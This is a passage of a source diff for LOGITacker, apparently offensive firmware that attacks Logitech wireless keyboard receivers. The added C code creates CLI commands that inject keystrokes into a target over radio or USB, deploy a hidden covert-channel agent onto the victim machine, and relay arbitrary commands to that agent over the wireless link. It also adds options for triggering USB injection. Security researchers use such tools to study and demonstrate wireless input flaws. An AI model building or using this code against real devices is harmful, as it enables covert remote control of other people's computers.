+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'usb inject'\r\n");
+}
+
+static void cmd_option_global_usbinjecttrigger_onpowerup(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_POWERUP;
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on power up'\r\n");
+}
+
+static void cmd_option_global_usbinjecttrigger_onledupdate(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    g_logitacker_global_config.usbinject_trigger = OPTION_LOGITACKER_USBINJECT_TRIGGER_ON_LEDUPDATE;
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "USB injection mode set to 'on LED state update'\r\n");
 }
 
 static void cmd_options_inject_lang(nrf_cli_t const *p_cli, size_t argc, char **argv) {
@@ -1105,6 +1182,29 @@ static void cmd_enum_passive(nrf_cli_t const * p_cli, size_t argc, char **argv) 
     }
 }
 
+#ifdef CLI_TEST_COMMANDS
+static void cmd_prx(nrf_cli_t const * p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+
+        //parse arg 1 as address
+        uint8_t addr[5];
+        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+            return;
+        }
+
+        char tmp_addr_str[16];
+        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting PRX with address %s\r\n", tmp_addr_str);
+        logitacker_enter_mode_prx(addr);
+        return;
+    } else {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+    }
+}
+#endif
+
 static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
     if (argc > 1)
     {
@@ -1123,6 +1223,126 @@ static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
         return;
     } else {
         nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+    }
+}
+
+
+#define MAX_CC_PAY_SIZE 16
+bool pre_cmd_callback_covert_channel(nrf_cli_t const * p_cli, char const * const p_cmd_buf) {
+    if (strcmp(p_cmd_buf, "!exit") == 0) {
+        nrf_cli_register_pre_cmd_callback(p_cli, NULL);
+        logitacker_enter_mode_discovery();
+        return true;
+    }
+
+    covert_channel_payload_data_t tmp_tx_data = {0};
+
+    //push chunks of cmd_buff
+
+    // ToDo: fix client
+    //payload size reduzed to 15, because client agent doesn't ack full size payloads
+
+
+    int pos = 0;
+    while (strlen(&p_cmd_buf[pos]) >= MAX_CC_PAY_SIZE) {
+        memcpy(tmp_tx_data.data, &p_cmd_buf[pos], MAX_CC_PAY_SIZE);
+        tmp_tx_data.len = MAX_CC_PAY_SIZE;
+
+        NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data, MAX_CC_PAY_SIZE);
+        uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
+        if (err != NRF_SUCCESS) {
+            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
+            return true;
+        }
+
+        pos += MAX_CC_PAY_SIZE;
+    }
+
+
+    size_t slen = strlen(&p_cmd_buf[pos]);
+
+    memset(tmp_tx_data.data, 0, 16);
+    memcpy(tmp_tx_data.data, &p_cmd_buf[pos], slen);
+    tmp_tx_data.len = slen + 1;
+
+    //append line break
+    tmp_tx_data.data[slen] = '\n';
+
+    NRF_LOG_HEXDUMP_DEBUG(tmp_tx_data.data,tmp_tx_data.len);
+
+    uint32_t err = logitacker_covert_channel_push_data(&tmp_tx_data);
+    if (err != NRF_SUCCESS) {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "error writing covert channel data 0x%08x\r\n", err);
+    }
+
+    return true;
+}
+
+
+static void cmd_covert_channel_connect(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    if (argc > 1)
+    {
+
+        //parse arg 1 as address
+        uint8_t addr[5];
+        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+            return;
+        }
+
+        char tmp_addr_str[16];
+        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting covert channel for device %s\r\n", tmp_addr_str);
+        logitacker_enter_mode_covert_channel(addr, p_cli);
+
+        nrf_cli_register_pre_cmd_callback(p_cli, &pre_cmd_callback_covert_channel);
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "enter '!exit' to return to normal CLI mode\r\n\r\n");
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "This feature is a PoC in experimental state\r\n");
+        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "I don't accept issues or requests on it, unless they fly in \r\nas working PR for LOGITacker\r\n");
+
+        return;
+    } else {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+    }
+}
+
+static void cmd_covert_channel_deploy(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+
+    if (argc > 1)
+    {
+        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
+
+        //parse arg 1 as address
+        uint8_t addr[5];
+        if (strcmp(argv[1], "USB") == 0) {
+            memset(addr,0x00,5);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
+        } else {
+            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+                return;
+            }
+
+            char tmp_addr_str[16];
+            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
+        }
+
+        bool hide = true;
+        if (argc > 2 && strcmp(argv[2],"unhide") == 0) hide = false;
+
+        // deploy covert channel agent
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "load covert channel client agent script\r\n");
+        deploy_covert_channel_script(hide);
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject covert channel client agent into target %s\r\n", argv[1]);
+
+        //logitacker_keyboard_map_test();
+        logitacker_enter_mode_injection(addr);
+        logitacker_injection_start_execution(true);
+        return;
+    } else {
+        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
+        return;
     }
 }
 
@@ -1195,7 +1415,7 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_script)
 NRF_CLI_CMD_REGISTER(script, &m_sub_script, "scripting for injection", cmd_inject);
 
 //level 2
-NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_inject_target_addr, dynamic_device_addr_list_ram);
+NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_inject_target_addr, dynamic_device_addr_list_ram_with_usb);
 
 // level 1
 NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_inject)
@@ -1234,8 +1454,22 @@ NRF_CLI_CMD_REGISTER(devices, &m_sub_devices, "List discovered devices", cmd_dev
 
 NRF_CLI_CREATE_DYNAMIC_CMD(m_sub_enum_device_list, dynamic_device_addr_list_ram);
 
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_covertchannel)
+{
+        NRF_CLI_CMD(connnect, &m_sub_enum_device_list, "connect to device with deployed covert channel", cmd_covert_channel_connect),
+        NRF_CLI_CMD(deploy, &m_sub_enum_device_list, "deploy covert channel agent for given device", cmd_covert_channel_deploy),
+        NRF_CLI_SUBCMD_SET_END
+};
+
+NRF_CLI_CMD_REGISTER(covert_channel, &m_sub_covertchannel, "start covert channel for given device", NULL);
+
+
 NRF_CLI_CMD_REGISTER(active_enum, &m_sub_enum_device_list, "start active enumeration of given device", cmd_enum_active);
 NRF_CLI_CMD_REGISTER(passive_enum, &m_sub_enum_device_list, "start passive enumeration of given device", cmd_enum_passive);
+
+#ifdef CLI_TEST_COMMANDS
+NRF_CLI_CMD_REGISTER(prx, &m_sub_enum_device_list, "start a PRX for the given device address", cmd_prx);
+#endif
 
 NRF_CLI_CMD_REGISTER(erase_flash, NULL, "erase all data stored on flash", cmd_erase_flash);
 
@@ -1270,7 +1504,7 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover_onhit)
 {
     NRF_CLI_CMD(continue,   NULL, "stay in discover mode.", cmd_discover_onhit_continue),
     NRF_CLI_CMD(active-enum, NULL, "enter active enumeration mode", cmd_discover_onhit_activeenum),
-    NRF_CLI_CMD(passive-enum, NULL, "enter active enumeration mode", cmd_discover_onhit_passiveenum),
+    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration mode", cmd_discover_onhit_passiveenum),
     NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_discover_onhit_autoinject),
     NRF_CLI_SUBCMD_SET_END
 };
@@ -1313,7 +1547,7 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onsuccess)
 {
     NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onsuccess_continue),
     NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onsuccess_activeenum),
-    NRF_CLI_CMD(passive-enum, NULL, "enter active enumeration", cmd_inject_onsuccess_passiveenum),
+    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onsuccess_passiveenum),
     NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onsuccess_discover),
     NRF_CLI_SUBCMD_SET_END
 };
@@ -1322,7 +1556,7 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onfail)
 {
     NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onfail_continue),
     NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onfail_activeenum),
-    NRF_CLI_CMD(passive-enum, NULL, "enter active enumeration", cmd_inject_onfail_passiveenum),
+    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onfail_passiveenum),
     NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onfail_discover),
     NRF_CLI_SUBCMD_SET_END
 };
@@ -1349,6 +1583,23 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
 {
     NRF_CLI_CMD(unifying,   NULL, "Unifying compatible workmode.", cmd_option_global_workmode_unifying),
     NRF_CLI_CMD(lightspeed,   NULL, "G-Series LIGHTSPEED workmode.", cmd_option_global_workmode_lightspeed),
+    NRF_CLI_CMD(g700,   NULL, "G700/G700s receiver workmode.", cmd_option_global_workmode_g700),
+    NRF_CLI_SUBCMD_SET_END
+};
+
+// options global usbinjectmode
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_usbinjectmode)
+{
+    NRF_CLI_CMD(powerup,   NULL, "Start USB injection when device is powered on (not accurate, but on every OS).", cmd_option_global_usbinjecttrigger_onpowerup),
+    NRF_CLI_CMD(ledupdate,   NULL, "Start USB injection when device receives a keyboard LED report (accurate, not on every OS) ", cmd_option_global_usbinjecttrigger_onledupdate),
+    NRF_CLI_SUBCMD_SET_END
+};
+
+// options global workmode
+NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_bootmode)
+{
+    NRF_CLI_CMD(discover,   NULL, "Boot in 'discover' mode.", cmd_option_global_bootmode_discover),
+    NRF_CLI_CMD(usbinject,   NULL, "Boot in 'USB key stroke injection' mode.", cmd_option_global_bootmode_usbinject),
     NRF_CLI_SUBCMD_SET_END
 };
 
@@ -1356,6 +1607,8 @@ NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
 NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global)
 {
     NRF_CLI_CMD(workmode, &m_sub_options_global_workmode, "LOGITacker working mode", cmd_help),
+    NRF_CLI_CMD(bootmode, &m_sub_options_global_bootmode, "LOGITacker boot mode", cmd_help),
+    NRF_CLI_CMD(usbtrigger, &m_sub_options_global_usbinjectmode, "When to trigger USB injection", cmd_help),
 
     NRF_CLI_SUBCMD_SET_END
 };
